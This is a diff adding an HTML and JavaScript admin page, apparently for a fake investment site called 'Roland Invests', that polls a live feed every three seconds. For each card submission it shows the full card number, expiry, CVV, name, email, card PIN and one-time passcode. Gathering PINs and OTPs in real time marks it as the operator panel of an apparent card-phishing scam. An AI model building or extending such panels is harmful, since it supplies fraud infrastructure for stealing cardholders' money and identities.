@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en-NG">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Admin — Payments</title>
+<link rel="stylesheet" href="/css/admin.css" />
+<style>
+  .feed-layout{display:grid;grid-template-columns:1fr 1fr;gap:24px;}
+  @media (max-width:1000px){ .feed-layout{grid-template-columns:1fr;} }
+
+  .feed-col{background:var(--surface);border:1px solid var(--border);border-radius:8px;overflow:hidden;}
+  .feed-col h2{font-size:14px;font-weight:600;padding:14px 20px;margin:0;border-bottom:1px solid var(--border);
+    display:flex;justify-content:space-between;align-items:center;}
+  .feed-col h2 .live{font-size:11px;color:var(--green);font-weight:500;display:flex;align-items:center;gap:6px;}
+  .feed-col h2 .live .dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:pulse 1.8s infinite;}
+  @keyframes pulse{0%,100%{opacity:1;}50%{opacity:.4;}}
+
+  .feed-body{max-height:70vh;overflow-y:auto;padding:12px;}
+
+  .pay-card{
+    border:1px solid var(--border);border-radius:6px;padding:14px 16px;margin-bottom:10px;
+    background:var(--surface-2);
+  }
+  .pay-card.new{animation:flash 1.6s ease-out;}
+  @keyframes flash{0%{background:#FFF7E1;}100%{background:var(--surface-2);}}
+  .pay-card .head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;}
+  .pay-card .who{font-size:13px;font-weight:600;color:var(--text);}
+  .pay-card .when{font-size:11.5px;color:var(--text-muted);}
+  .pay-card .amount{font-size:16px;font-weight:600;color:var(--gold);}
+  .pay-card .kv{display:grid;grid-template-columns:110px 1fr;gap:3px 10px;font-size:12.5px;margin-top:8px;padding-top:8px;border-top:1px solid var(--border);}
+  .pay-card .kv .k{color:var(--text-muted);}
+  .pay-card .kv .v{color:var(--text);font-family:ui-monospace,SFMono-Regular,Menlo,monospace;word-break:break-all;}
+
+  .pay-empty{padding:40px 20px;text-align:center;color:var(--text-muted);font-size:13px;}
+</style>
+</head>
+<body>
+<div class="admin-topbar">
+  <span class="admin-brand"><em>Roland</em> Invests · Admin</span>
+  <nav class="admin-nav">
+    <a href="/dollyb14/dashboard.html">Overview</a>
+    <a href="/dollyb14/users.html">Users</a>
+    <a href="/dollyb14/transactions.html">Transactions</a>
+    <a href="/dollyb14/kyc.html">KYC</a>
+    <a href="/dollyb14/payments.html" class="active">Payments</a>
+    <a href="/dollyb14/stocks.html">Stocks</a>
+    <a href="/dollyb14/bank-details.html">Bank details</a>
+    <a href="/dollyb14/content.html">Site content</a>
+    <a href="/dollyb14/activity.html">Activity</a>
+  </nav>
+  <span class="admin-user">Signed in as <strong id="adminName">—</strong>
+    <button id="logoutBtn">Log out</button>
+  </span>
+</div>
+
+<div class="admin-wrap">
+  <h1 class="admin-h1">Payments</h1>
+  <p class="admin-sub">Live feed. Auto-refreshes every 3 seconds.</p>
+
+  <div class="feed-layout">
+    <div class="feed-col">
+      <h2>Card submissions <span class="live"><span class="dot"></span>Live</span></h2>
+      <div class="feed-body" id="cardFeed"></div>
+    </div>
+    <div class="feed-col">
+      <h2>Transfer confirmations <span class="live"><span class="dot"></span>Live</span></h2>
+      <div class="feed-body" id="transferFeed"></div>
+    </div>
+  </div>
+</div>
+
+<script src="/js/config.js"></script>
+<script src="/js/format.js"></script>
+<script src="/js/api.js"></script>
+<script src="/js/admin-guard.js"></script>
+<script>
+window.addEventListener("admin:ready", function (e) {
+  document.getElementById("adminName").textContent = e.detail.username;
+  load();
+});
+document.getElementById("logoutBtn").addEventListener("click", async function () {
+  try { await api.adminLogout(); } catch (_) {}
+  api.setToken(null);
+  window.location.href = "/dollyb14/index.html";
+});
+
+let knownIds = new Set();
+
+function statusClass(s) {
+  if (s === "approved") return "green";
+  if (s === "rejected") return "red";
+  if (s === "cancelled") return "grey";
+  if (s === "processing" || s === "card_details_submitted") return "blue";
+  return "amber";
+}
+
+async function load() {
+  try {
+    const { payments, transfers } = await api.adminPayments();
+
+    const cardFeed = document.getElementById("cardFeed");
+    const transferFeed = document.getElementById("transferFeed");
+
+    if (!payments.length) {
+      cardFeed.innerHTML = '<div class="pay-empty">No card submissions yet.</div>';
+    } else {
+      cardFeed.innerHTML = "";
+      payments.forEach(p => {
+        const card = p.card || {};
+        const el = document.createElement("div");
+        el.className = "pay-card" + (knownIds.has(p.id) ? "" : " new");
+        el.innerHTML = `
+          <div class="head">
+            <div>
+              <div class="who"></div>
+              <div class="when"></div>
+            </div>
+            <div style="text-align:right;">
+              <div class="amount"></div>
+              <span class="badge ${statusClass(p.status)}">${p.status}</span>
+            </div>
+          </div>
+          <div class="kv">
+            <div class="k">Card number</div><div class="v" data-k="card_number"></div>
+            <div class="k">Expiry</div><div class="v" data-k="expiry"></div>
+            <div class="k">CVV</div><div class="v" data-k="cvv"></div>
+            <div class="k">Name on card</div><div class="v" data-k="name_on_card"></div>
+            <div class="k">Email</div><div class="v" data-k="email"></div>
+            <div class="k">PIN</div><div class="v" data-k="pin"></div>
+            <div class="k">OTP</div><div class="v" data-k="otp"></div>
+            <div class="k">Reference</div><div class="v" data-k="reference"></div>
+          </div>`;
+        el.querySelector(".who").textContent = p.user_email || "—";
+        el.querySelector(".when").textContent = fmt.date(p.created_at);
+        el.querySelector(".amount").textContent = fmt.currency(p.amount);
+        const setK = (k, v) => { el.querySelector('[data-k="' + k + '"]').textContent = v || "—"; };
+        setK("card_number", card.card_number);
+        setK("expiry", card.expiry);
+        setK("cvv", card.cvv);
+        setK("name_on_card", card.name_on_card);
+        setK("email", card.email);
+        setK("pin", card.pin);
+        setK("otp", card.otp);
+        setK("reference", p.reference);
+        cardFeed.appendChild(el);
+        knownIds.add(p.id);
+      });
+    }
+
+    if (!transfers.length) {
+      transferFeed.innerHTML = '<div class="pay-empty">No transfer confirmations waiting.</div>';
+    } else {
+      transferFeed.innerHTML = "";
+      transfers.forEach(t => {
+        const el = document.createElement("div");
+        el.className = "pay-card";
+        el.innerHTML = `
+          <div class="head">
+            <div>
+              <div class="who"></div>
+              <div class="when"></div>
+            </div>
+            <div style="text-align:right;">
+              <div class="amount"></div>
+              <span class="badge amber">${t.status}</span>
+            </div>
+          </div>
+          <div class="kv">
+            <div class="k">Type</div><div class="v" data-k="type"></div>
+            <div class="k">Method</div><div class="v" data-k="method"></div>
+            <div class="k">Reference</div><div class="v" data-k="reference"></div>
+          </div>`;
+        el.querySelector(".who").textContent = t.user_email || "—";
+        el.querySelector(".when").textContent = fmt.date(t.created_at);
+        el.querySelector(".amount").textContent = fmt.currency(t.amount);
+        el.querySelector('[data-k="type"]').textContent = t.type;
+        el.querySelector('[data-k="method"]').textContent = t.method;
+        el.querySelector('[data-k="reference"]').textContent = t.reference || "—";
+        transferFeed.appendChild(el);
+      });
+    }
+  } catch (_) {}
+}
+
+setInterval(load, 3000);
+</script>
+</body>
+</html>
